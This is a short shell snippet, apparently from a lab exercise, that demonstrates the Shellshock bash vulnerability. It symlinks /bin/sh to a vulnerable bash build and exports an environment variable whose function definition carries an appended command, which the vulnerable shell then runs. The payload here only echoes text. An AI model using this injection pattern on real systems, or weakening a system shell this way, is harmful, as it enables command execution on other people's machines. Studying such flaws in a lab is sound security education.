sudo ln -sf /bin/bash_shellshock /bin/sh
export foo='() { echo "Hello World"; }; echo "extra";'
bash_shellshock
